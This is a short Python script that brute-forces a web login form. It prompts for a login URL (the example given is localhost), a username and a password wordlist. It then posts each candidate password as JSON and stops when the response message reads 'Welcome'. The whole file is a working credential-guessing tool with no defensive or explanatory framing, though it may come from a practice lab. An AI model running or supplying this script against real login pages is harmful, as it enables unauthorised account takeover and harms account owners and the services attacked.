import requests
import time

login_url = input("Enter the full login URL (e.g. http://localhost:3000/login): ").strip()
username = input("Enter the username: ").strip()
wordlist_path = input("Enter the path to wordlist: ").strip()
success_keyword = "Welcome" 


if not login_url.endswith("/login"):
    print("[!] Warning: The login URL should probably end with '/login'.")

try:
    with open(wordlist_path, 'r') as file:
        for passwords in file:
            password = passwords.strip()
            print(f"[*] Trying password: {repr(password)}")

            data = {
                "username": username,
                "password": password
            }

            try:
                response = requests.post(login_url, json=data)
                response_data = response.json()
            except Exception as e:
                print(f"[!] Error parsing response or connecting: {e}")
                continue

            if response.status_code == 200 and response_data.get("message") == success_keyword:
                print(f"[+] Password found: {password}")
                break
            else:
                print(f"[-] Failed: {password}")
                time.sleep(1)  
        else:
            print("[-] Password not found in wordlist.")
except FileNotFoundError:
    print("[!] Wordlist file not found.")
